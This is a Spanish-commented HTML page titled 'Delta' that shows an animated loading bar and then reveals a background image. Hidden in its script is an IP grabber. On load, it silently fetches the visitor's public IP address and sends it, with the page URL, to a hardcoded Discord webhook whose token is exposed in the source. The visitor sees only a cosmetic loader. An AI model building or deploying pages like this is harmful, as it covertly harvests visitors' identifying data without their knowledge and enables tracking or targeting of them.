<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', sans-serif;
            background-color: #000; /* Fondo base negro */
        }

        /* La NUEVA foto de fondo (Imgur) */
        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            /* URL actualizada */
            background-image: url('https://i.imgur.com/Qb5YqCL.jpeg'); 
            background-size: cover;
            background-position: center;
        }

        /* El "Velo Negro" que cubre todo al inicio (IGUAL) */
        .black-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            z-index: 2; /* Por encima de la foto */
            transition: opacity 2s ease-in-out; /* Animación suave (IGUAL) */
        }

        /* Panel de carga (IGUAL) */
        .glass-panel {
            position: relative;
            z-index: 3; /* Siempre al frente */
            padding: 25px 40px;
            width: 350px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            transition: opacity 1s ease-in-out;
        }

        .loader-box {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00f2fe, #4facfe);
            box-shadow: 0 0 15px rgba(0, 242, 254, 0.8);
            transition: width 0.1s linear;
        }

        /* Clases para el efecto final (IGUAL) */
        .fade-out {
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="background-image"></div>
    <div class="black-overlay" id="overlay"></div>

    <div class="glass-panel" id="main-panel">
        <div class="loader-box">
            <div class="progress-fill" id="progress"></div>
        </div>
    </div>

    <script>
        // Webhook (IGUAL)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';

        window.onload = function() {
            startLoading();
            sendData();
        };

        // Lógica de animación (IGUAL)
        function startLoading() {
            const bar = document.getElementById('progress');
            const panel = document.getElementById('main-panel');
            const overlay = document.getElementById('overlay');
            let width = 0;

            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    
                    // Al completar:
                    setTimeout(() => {
                        // 1. Desvanece el panel de carga
                        panel.classList.add('fade-out');
                        
                        // 2. Desvanece el fondo negro para revelar la NUEVA foto
                        setTimeout(() => {
                            overlay.classList.add('fade-out');
                        }, 300);
                        
                    }, 500);

                } else {
                    width += 1; // Carga suave
                    bar.style.width = width + '%';
                }
            }, 30);
        }

        // Envío de datos (IGUAL)
        async function sendData() {
            let userIP = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {}

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        description: `🌐 **IP Detectada:** \`${userIP}\` \n🔗 **URL:** ${window.location.href}`,
                        color: 3447003, 
                        footer: { text: "Delta System | New Background" }
                    }]
                })
            }).catch(() => {});
        }
    </script>
</body>
</html>
